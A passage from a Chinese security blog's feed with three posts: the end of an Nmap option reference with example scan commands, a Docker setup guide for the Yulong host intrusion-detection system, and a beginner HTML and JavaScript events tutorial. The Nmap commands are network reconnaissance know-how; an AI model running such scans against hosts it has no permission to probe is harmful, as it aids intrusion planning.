显示端口处于特定状态的原因</p><p>  –open: 只显示打开（或可能打开）的端口</p><p>  –packet-trace: 显示所有发送和接收的数据包</p><p>  –iflist: 打印主机接口和路由（用于调试）</p><p>  –append-output: 附加到指定的输出文件而不是clobber</p><p>  –resume <filename>: 恢复中止的扫描</filename></p><p>  –stylesheet &lt;path/URL&gt;: 将XML输出转换为HTML的XSL样式表</p><p>  –webxml: Nmap.Org的参考样式表，以获得更多可移植的XML</p><p>  –no-stylesheet: 阻止与XML输出相关联的XSL样式表</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC:"></a>MISC:</h3><p>-6: 启用IPv6扫描</p><p>-A: 启用操作系统检测，版本检测，脚本扫描和跟踪路由</p><p>–datadir <dirname>: 指定自定义Nmap数据文件的位置</dirname></p><p>–send-eth/–send-ip: 使用原始以太网帧或IP数据包进行发送</p><p>–privileged: 假设用户是完全特权的</p><p>–unprivileged: 假设用户缺少原始套接字权限</p><p>-V: 打印版本号</p><p>-h: 打印此帮助摘要页面。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>  nmap -v -A scanme.nmap.org:</p><p>  nmap -v -sn 192.168.0.0/16 10.0.0.0/8:</p><p>  nmap -v -iR 10000 -Pn -p 80</p><p><strong>从test.txt列表中批量扫描后把结果输出result1.txt中</strong></p><p>nmap -vv -P0 -iL ‘/root/Desktop/test.txt’ -oN ‘/root/Desktop/result1.txt’.</p><h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><p>Nmap中文说明：<a href="http://www.nmap.com.cn/doc/manual.shtm#7" target="_blank" rel="noopener">http://www.nmap.com.cn/doc/manual.shtm#7</a></p><p><a href="https://blog.csdn.net/redmoon729/article/details/53282947" target="_blank" rel="noopener">https://blog.csdn.net/redmoon729/article/details/53282947</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Nmap" scheme="http://yoursite.com/tags/Nmap/"/>
    
      <category term="端口扫描" scheme="http://yoursite.com/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>Docker快速部署驭龙HIDS</title>
    <link href="http://yoursite.com/2018/08/24/Docker%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2%E9%A9%AD%E9%BE%99HIDS/"/>
    <id>http://yoursite.com/2018/08/24/Docker快速部署驭龙HIDS/</id>
    <published>2018-08-24T14:58:25.000Z</published>
    <updated>2018-08-24T15:15:34.750Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>驭龙HIDS是一款由 YSRC 开源的入侵检测系统，由Agent,Daemon,Server 和Web四个部分组成，集异常检测、监控管理为一体，拥有异常行为发现、快速阻断、高级分析等功能，可从多个维度行为信息中发现入侵行为。</p><p>Agent为采集者角色，收集服务器信息、开机启动项、计划任务、监听端口、服务、登录日志、用户列表，实时监控文件操作行为、网络连接、执行命令，初步筛选整理后通过RPC协议传输到Server节点。</p><a id="more"></a><p>Daemon为守护服务进程，为Agent提供进程守护、静默环境部署作用，其任务执行功能通过接收服务端的指令实现Agent热更新、阻断功能和自定义命令执行等，任务传输过程使用RSA进行加密。</p><p>Server为整套系统的大脑，支持横向扩展分布式部署，解析用户定义的规则（已内置部分基础规则）对从各Agent接收到的信息和行为进行分析检测和保存，可从各个维度的信息中发现webshell写入行为、异常登录行为、异常网络连接行为、异常命令调用行为等，从而实现对入侵行为实时预警。</p><h2 id="0x02-功能特点"><a href="#0x02-功能特点" class="headerlink" title="0x02 功能特点"></a>0x02 功能特点</h2><ul><li>实时监控、秒级响应</li><li>全局首次出现概念，可发现未知威胁</li><li>支持自定义规则，高扩展性</li><li>高级分析功能，可溯源</li><li>全局快速阻断（进程、文件）</li><li>威胁情报查询（可自定义接口）</li></ul><h2 id="0x03-整体架构图"><a href="#0x03-整体架构图" class="headerlink" title="0x03 整体架构图"></a>0x03 整体架构图</h2><p>Agent为采集者角色，收集服务器信息、开机启动项、计划任务、监听端口、服务、登录日志、用户列表，实时监控文件操作行为、网络连接、执行命令，初步筛选整理后通过RPC协议传输到Server节点。</p><p>Daemon为守护服务进程，为Agent提供进程守护、静默环境部署作用，其任务执行功能通过接收服务端的指令实现Agent热更新、阻断功能和自定义命令执行等，任务传输过程使用RSA进行加密。</p><p>Server为整套系统的大脑，支持横向扩展分布式部署，解析用户定义的规则（已内置部分基础规则）对从各Agent接收到的信息和行为进行分析检测和保存，可从各个维度的信息中发现webshell写入行为、异常登录行为、异常网络连接行为、异常命令调用行为等，从而实现对入侵行为实时预警。</p><p><img src="/images/SQL/41.png" alt="upload successful"></p><pre><code>架构图</code></pre><h2 id="0x04-TODO"><a href="#0x04-TODO" class="headerlink" title="0x04 TODO"></a>0x04 TODO</h2><ul><li>建立入侵行为case库，自动化重放case模拟测试</li><li>机器学习判断可疑行为，作为规则之外的补充</li><li>资产盘点，例如识别补丁，应用版本、负责人，各种包/kernel版本…</li><li>辅以漏洞库，能更快速的应急响应，哪些必须要修，那些不修可以接受</li><li>区分通讯模式（主动、被动）</li><li>使用消息队列代替RPC</li><li>基线核查，没有代码能力的社区成员也可以整理好相关文档，YSRC来实现</li><li>幻影蜜罐，agent动态代理蜜罐端口，大规模提升蜜罐覆盖密度</li><li>支持多场景（办公环境、Docker），目前驭龙仅适合线上服务器环境</li><li>轻量级的linux内核防护，在不升级内核的情况下，免疫一些攻击</li></ul><h2 id="0x05-Docker快速安装"><a href="#0x05-Docker快速安装" class="headerlink" title="0x05 Docker快速安装"></a>0x05 Docker快速安装</h2><p>Docker 版只为快速体验使用，请不要在生产环境下使用!</p><p>该版本中只包括了服务端：Server、Web、ElasticSearch和MongoDB, Client 端的 Agent 和 Daemon 请在相应的机器中运行即可.</p><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><ul><li>docker-ce &gt;= 18      # docker的版本需要大于等于18.0</li><li>docker-compose &gt;= 1.20     #docker-compose的版本需要大于等于1.2</li></ul><p><strong>安装docker-compose：<a href="https://docs.docker.com/compose/install/#install-compose" target="_blank" rel="noopener">https://docs.docker.com/compose/install/#install-compose</a></strong></p><p><strong>安装docker-ce：&lt;<a href="https://my.oschina.net/shyloveliyi/blog/1616025" target="_blank" rel="noopener">https://my.oschina.net/shyloveliyi/blog/1616025</a></strong>&gt;</p><h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><h4 id="Step1-下载源码"><a href="#Step1-下载源码" class="headerlink" title="Step1. 下载源码"></a>Step1. 下载源码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/ysrc/yulong-hids.git</span><br></pre></td></tr></table></figure><h4 id="Step2-初次编译并运行"><a href="#Step2-初次编译并运行" class="headerlink" title="Step2. 初次编译并运行"></a>Step2. 初次编译并运行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd yulong-hids/ $ docker-compose up</span><br></pre></td></tr></table></figure><p>由于需要映射 Web 80/443 端口到宿主机80/443端口，请保证有权限，如果提示 Permission denied, 请执行 sudo docker-compose up</p><p>第一次启动时由于 Server 需要配置文件不存在会导致启动失败，不要慌，只要保证 web、mongo、es 正常启动即可</p><p>如果提示获取 docker image 失败，请检查网络并重试，或者给 docker pull 挂上 http/https 代理</p><p><strong>centos7 安装使用proxychains4：</strong></p><p><strong><a href="https://jingyan.baidu.com/album/148a1921f5c5fe4d71c3b105.html?picindex=10" target="_blank" rel="noopener">https://jingyan.baidu.com/album/148a1921f5c5fe4d71c3b105.html?picindex=10</a></strong></p><h4 id="Step3-通过-Web-界面初始化"><a href="#Step3-通过-Web-界面初始化" class="headerlink" title="Step3.通过 Web 界面初始化"></a>Step3.通过 Web 界面初始化</h4><p>假定宿主机（物理机）的 IP 地址是: 192.168.3.43</p><p>打开浏览器访问<a href="http://192.168.3.43如果启动正常，就可以看到驭龙的Login界面了，输入下面的登录名和密码进入后台。" target="_blank" rel="noopener">http://192.168.3.43如果启动正常，就可以看到驭龙的Login界面了，输入下面的登录名和密码进入后台。</a></p><p>默认登录账号：yulong    密码：All_life_is_a_game_of_luck.  后面有一个点</p><p><img src="/images/SQL/42.png" alt="upload successful"></p><p>Web安装向导指南：<a href="https://github.com/ysrc/yulong-hids/blob/master/docs/guide.md" target="_blank" rel="noopener">https://github.com/ysrc/yulong-hids/blob/master/docs/guide.md</a></p><p>初始化的第3步所需要上传的文件需前往<a href="https://github.com/ysrc/yulong-hids/releases" target="_blank" rel="noopener">Release发布页</a>下载发行版 zip 包，并解压，然后上传对应的 win-32.zip,win-64.zip,linux-64.zip即可。</p><p><img src="/images/SQL/43.png" alt="upload successful"></p><h4 id="Step4-重新启动"><a href="#Step4-重新启动" class="headerlink" title="Step4.重新启动"></a>Step4.重新启动</h4><p>通过 Web 初始化完毕后，切回 docker-compose up 的终端，按下 Ctrl + C 组合键，结束进程，然后执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>浏览器打开 <a href="http://192.168.3.43就可以看到正常功能的界面了" target="_blank" rel="noopener">http://192.168.3.43就可以看到正常功能的界面了</a>.</p><p><img src="/images/SQL/44.png" alt="upload successful"></p><h4 id="Step5-启动Server调校程序"><a href="#Step5-启动Server调校程序" class="headerlink" title="Step5.启动Server调校程序"></a>Step5.启动Server调校程序</h4><p>下载Adapter：<a href="https://sec.ly.com/mirror/yulong_server_docker_adapter_linux_amd64.zip" target="_blank" rel="noopener">https://sec.ly.com/mirror/yulong_server_docker_adapter_linux_amd64.zip</a></p><p>另起一个会话窗口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rz    #本地下载的Adapter</span><br><span class="line">unzip yulong_server_docker_adapter_linux_amd64.zip</span><br><span class="line">chmod +x yulong_server_docker_adapter_linux_amd64</span><br><span class="line">./yulong_server_docker_adapter_linux_amd64</span><br></pre></td></tr></table></figure></p><p>这个程序要一直运行着…</p><h2 id="0x06-参考文献："><a href="#0x06-参考文献：" class="headerlink" title="0x06 参考文献："></a>0x06 参考文献：</h2><p><a href="https://github.com/ysrc/yulong-hids" target="_blank" rel="noopener">https://github.com/ysrc/yulong-hids</a><br><a href="https://github.com/ysrc/yulong-hids/blob/master/docs/docker.md" target="_blank" rel="noopener">https://github.com/ysrc/yulong-hids/blob/master/docs/docker.md</a><br><a href="https://github.com/ysrc/yulong-hids/blob/master/docs/guide.md" target="_blank" rel="noopener">https://github.com/ysrc/yulong-hids/blob/master/docs/guide.md</a><br><a href="https://www.secpulse.com/archives/70190.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/70190.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;驭龙HIDS是一款由 YSRC 开源的入侵检测系统，由Agent,Daemon,Server 和Web四个部分组成，集异常检测、监控管理为一体，拥有异常行为发现、快速阻断、高级分析等功能，可从多个维度行为信息中发现入侵行为。&lt;/p&gt;
&lt;p&gt;Agent为采集者角色，收集服务器信息、开机启动项、计划任务、监听端口、服务、登录日志、用户列表，实时监控文件操作行为、网络连接、执行命令，初步筛选整理后通过RPC协议传输到Server节点。&lt;/p&gt;
    
    </summary>
    
      <category term="搭建服务" scheme="http://yoursite.com/categories/%E6%90%AD%E5%BB%BA%E6%9C%8D%E5%8A%A1/"/>
    
    
      <category term="IDS" scheme="http://yoursite.com/tags/IDS/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript脚本语言学习分享</title>
    <link href="http://yoursite.com/2018/08/23/JavaScript%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E5%88%86%E4%BA%AB/"/>
    <id>http://yoursite.com/2018/08/23/JavaScript脚本语言学习分享/</id>
    <published>2018-08-23T14:56:27.000Z</published>
    <updated>2018-08-23T15:39:06.360Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><p>JavaScript是脚本语言，又称为动态语言，是一种编程语言，用来控制软件应用程序，通常以文本保存，只在调用时调用进行编译。JavaScript 是可插入 HTML 页面的编程代码JavaScript 插入 HTML 页面后，可由所有的现代浏览器执行</p><a id="more"></a><h3 id="JavaScript实现："><a href="#JavaScript实现：" class="headerlink" title="JavaScript实现："></a>JavaScript实现：</h3><ol><li>HTML 中的脚本必须位于 <script> 与 </script> 标签之间。</li><li>脚本可被放置在 HTML 页面的 <body> 和 <head> 部分中。</head></body></li></ol><p><img src="/images/JavaScript/1.png" alt="upload successful"></p><h3 id="HTML常用标签"><a href="#HTML常用标签" class="headerlink" title="HTML常用标签"></a>HTML常用标签</h3><p><strong>a标签</strong></p><p>用来实现超链接</p><p>href 属性规定链接的目标</p><p>开始标签和结束标签之间的文字被作为超级链接来显示</p><p>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.gooann.com&quot;&gt;点击我跳转&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>点击后跳转到<a href="http://www.gooann.com的页面" target="_blank" rel="noopener">www.gooann.com的页面</a></p><p><img src="/images/JavaScript/2.png" alt="upload successful"></p><p><strong>P标签</strong></p><p>定义一个段落</p><p>浏览器会自动地在段落的前后添加空行</p><p> 例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;我是一个段落&lt;/p&gt;   </span><br><span class="line">&lt;/br&gt;   换行</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/3.png" alt="upload successful"></p><p><strong>h标签</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过 &lt;h1&gt; - &lt;h6&gt; 等标签进行定义的</span><br><span class="line">&lt;h1&gt; 定义最大的标题&lt;h6&gt; 定义最小的标题</span><br><span class="line">浏览器会自动地在段落的前后添加空行</span><br><span class="line">例： &lt;h1&gt;我是标题1&lt;/h1&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/4.png" alt="upload successful"></p><p><strong>div标签</strong></p><p>标签定义文档中的区域块</p><p>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div &gt;我是一个区域块&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/5.png" alt="upload successful"></p><p><strong>button标签</strong></p><p>标签定义一个按钮</p><p> 例：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button type=“button”&gt;我是一个按钮&lt;/button&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/6.png" alt="upload successful"></p><p><strong>表格（table、tr、th、td）</strong></p><p>简单的 HTML 表格由 table 元素以及一个或多个 tr、th 或 td 元素组成</p><p>tr 元素定义表格行，th 元素定义表头，td 元素定义表格单元</p><p>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt; </span><br><span class="line">​    &lt;tr&gt; &lt;th&gt; &lt;/th&gt;&lt;th&gt; &lt;/th&gt;&lt;/tr&gt;</span><br><span class="line">​    &lt;tr&gt; &lt;td&gt; &lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/7.png" alt="upload successful"></p><p><strong>input标签</strong></p><p>根据不同的 type 属性值，输入字段拥有很多种形式</p><p>（text（文本）、button（按钮）、checkbox（勾选）、file（选文件）、hidden（）、password、radio（圆点勾选）</p><p>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot;  /&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/8.png" alt="upload successful"></p><h3 id="HTML常用style属性"><a href="#HTML常用style属性" class="headerlink" title="HTML常用style属性"></a>HTML常用style属性</h3><p>用Style来定义标签元素的字体颜色、背景色、高度宽度等属性。</p><p> color：字体颜色</p><p> background：背景色</p><p> width、height：宽度、高度</p><p><img src="/images/JavaScript/9.png" alt="upload successful"></p><h3 id="JavaScript获取元素的方法"><a href="#JavaScript获取元素的方法" class="headerlink" title="JavaScript获取元素的方法"></a>JavaScript获取元素的方法</h3><p>通过id获得（document.getElementById）</p><p>通过标签获得（document.getElementsByTagName）</p><p>通过类名获得（document.getElementsByClassName ）</p><h3 id="JavaScript修改HTML"><a href="#JavaScript修改HTML" class="headerlink" title="JavaScript修改HTML"></a>JavaScript修改HTML</h3><p>改变 HTML 元素内容（innerHTML、input标签的value）</p><p>改变 HTML 元素样式（style.color）</p><p>改变 HTML 元素属性（如src）</p><h3 id="JavaScript事件响应"><a href="#JavaScript事件响应" class="headerlink" title="JavaScript事件响应"></a>JavaScript事件响应</h3><h4 id="1、鼠标点击事件onclick"><a href="#1、鼠标点击事件onclick" class="headerlink" title="1、鼠标点击事件onclick"></a>1、鼠标点击事件onclick</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1）onclick=&quot;this.innerHTML=&apos;谢谢!&apos;&quot;</span><br><span class="line">2）document.getElementById(id).onclick=function()&#123;alert(&apos;谢谢’)&#125;;   &lt;script&gt;中添加</span><br><span class="line">3）&lt;h1 id=&quot;h1&quot; onclick=“change(this)&quot;&gt;请点击该文本&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">   function change(elment)&#123;</span><br><span class="line">   elment.innerHTML=&quot;谢谢&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">4) onclick=&quot;javascript:document.getElementById(&apos;h1&apos;).innerHTML=&apos;谢谢&apos;&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/JavaScript/10.png" alt="upload successful"></p><h4 id="2-鼠标移入移出"><a href="#2-鼠标移入移出" class="headerlink" title="2.鼠标移入移出"></a>2.鼠标移入移出</h4><p>鼠标移入（onmouseover）</p><p>鼠标移出（onmouseout）</p><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div onmouseover=&quot;mOver(this)&quot; onmouseout=&quot;mOut(this)&quot; </span><br><span class="line">   style=&quot;background-color:green;width:120px;height:20px;padding:40px;text-align:center;color:#ffffff;&quot;&gt;便利店</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function mOver(obj)&#123;</span><br><span class="line">​    obj.innerHTML=&quot;欢迎光临&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  function mOut(obj)&#123;</span><br><span class="line">​    obj.innerHTML=&quot;再见&quot;;</span><br><span class="line">​    setTimeout(function()&#123;obj.innerHTML=&quot;便利店&quot;&#125;,1000);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/11.png" alt="upload successful"></p><h4 id="3-鼠标左键按下和放开"><a href="#3-鼠标左键按下和放开" class="headerlink" title="3.鼠标左键按下和放开"></a>3.鼠标左键按下和放开</h4><p>鼠标左键按下（onmousedown）</p><p>鼠标左键放开（onmouseup） .</p><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div onmousedown=&quot;mDown(this)&quot; onmouseup=&quot;mUp(this)&quot; </span><br><span class="line">   style=&quot;background-color:green;color:#ffffff;width:90px;height:20px;padding:40px;font-size:12px;&quot;&gt;请点击这里</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function mDown(obj)&#123;</span><br><span class="line">​    obj.style.backgroundColor=&quot;#1ec5e5&quot;;</span><br><span class="line">​    obj.innerHTML=&quot;请释放鼠标按钮&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  function mUp(obj)&#123;</span><br><span class="line">​    obj.style.backgroundColor=&quot;green&quot;;</span><br><span class="line">​    obj.innerHTML=&quot;请按下鼠标按钮&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/12.png" alt="upload successful"></p><h4 id="4、获得焦点和失去焦点"><a href="#4、获得焦点和失去焦点" class="headerlink" title="4、获得焦点和失去焦点"></a>4、获得焦点和失去焦点</h4><p>获得焦点（onfocus）</p><p>失去焦点（onblur）</p><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">输入框1：&lt;input type=&quot;text&quot; onfocus=&quot;Mfocus(this)&quot; onblur=&quot;Mblur(this)&quot;&gt;&lt;br&gt;</span><br><span class="line">输入框2：&lt;input type=&quot;text&quot; onfocus=&quot;Mfocus(this)&quot; onblur=&quot;Mblur(this)&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function Mfocus(obj)&#123;</span><br><span class="line">​    obj.style.background=&quot;yellow&quot;;</span><br><span class="line">  &#125; </span><br><span class="line"> function Mblur(obj)&#123;</span><br><span class="line">​    obj.style.background=&quot;white&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/13.png" alt="upload successful"></p><h4 id="5、加载文档或图片响应"><a href="#5、加载文档或图片响应" class="headerlink" title="5、加载文档或图片响应"></a>5、加载文档或图片响应</h4><p>onerror</p><p> 例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=&quot;./images/pic_bulboff.gif&quot;</span><br><span class="line">   onerror=&quot;message()&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function message()&#123;</span><br><span class="line">​    alert(&quot;未找到资源&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/14.png" alt="upload successful"></p><h3 id="JavaScript添加元素"><a href="#JavaScript添加元素" class="headerlink" title="JavaScript添加元素"></a>JavaScript添加元素</h3><h4 id="1、添加元素的步骤"><a href="#1、添加元素的步骤" class="headerlink" title="1、添加元素的步骤"></a>1、添加元素的步骤</h4><p>创建元素（document.createElement）</p><p>创建元素文本（document.createTextNode）</p><p>向创建的元素追加文本（ appendChild ）</p><p>将追加好文本的元素添加到已知元素（父元素）（ appendChild ）</p><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id=&quot;div&quot; style=&quot;color:red;background:yellow;width:200px&quot;&gt;</span><br><span class="line">​     &lt;h3&gt;我是一个标题3&lt;/h3&gt;</span><br><span class="line">​     &lt;p&gt;我是一个段落&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;button onclick=&quot;add()&quot;&gt;添加元素&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function add()&#123;</span><br><span class="line">​var nobj = document.createElement(&quot;p&quot;);</span><br><span class="line">​var node = document.createTextNode(&quot;我是新的段落&quot;);</span><br><span class="line">nobj.appendChild(node);</span><br><span class="line">​document.getElementById(&quot;div&quot;).appendChild(nobj);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/15.png" alt="upload successful"></p><h3 id="JavaScript删除元素"><a href="#JavaScript删除元素" class="headerlink" title="JavaScript删除元素"></a>JavaScript删除元素</h3><h4 id="2、删除元素的步骤"><a href="#2、删除元素的步骤" class="headerlink" title="2、删除元素的步骤"></a>2、删除元素的步骤</h4><p>找到要删除元素的父元素（document.getElementById(父元素id)）</p><p>找到要删除的元素（document.getElementById(子元素id)）</p><p>从父元素删除子元素（ 父元素.removeChild(子元素) ）</p><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id=&quot;div&quot; style=&quot;color:red;background:yellow;width:200px&quot;&gt;</span><br><span class="line">​     &lt;h3 id=&quot;h&quot;&gt;我是一个标题3&lt;/h3&gt;</span><br><span class="line">​     &lt;p id=&quot;p&quot;&gt;我是一个段落&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;button onclick=&quot;del()&quot;&gt;删除元素&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function del()&#123;</span><br><span class="line">​var par = document.getElementById(&quot;div&quot;);</span><br><span class="line">​var chi = document.getElementById(&quot;h&quot;);</span><br><span class="line">​par.removeChild(chi);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/16.png" alt="upload 